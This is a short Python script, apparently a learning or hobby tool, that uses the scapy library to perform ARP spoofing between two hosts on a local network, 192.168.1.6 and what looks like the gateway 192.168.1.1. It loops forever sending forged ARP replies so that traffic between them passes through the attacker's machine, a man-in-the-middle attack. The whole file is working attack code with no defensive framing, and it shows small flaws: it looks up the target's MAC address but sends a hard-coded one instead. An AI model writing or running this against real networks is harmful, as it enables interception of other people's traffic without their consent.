#!/usr/bin/python

import scapy.all as scapy
import time
import sys

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose = False)[0]
    
    return answered_list[0][1].hwsrc
    
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst='b8:27:eb:df:fb:70', psrc=spoof_ip)
    scapy.send(packet, verbose=False)

sent_packets_count = 0
while True:
    spoof('192.168.1.6', '192.168.1.1')
    spoof('192.168.1.1', '192.168.1.6')
    sent_packets_count = sent_packets_count + 2
    print('\r[+] Packets sent: ' + str(sent_packets_count)),
    sys.stdout.flush()
    time.sleep(2)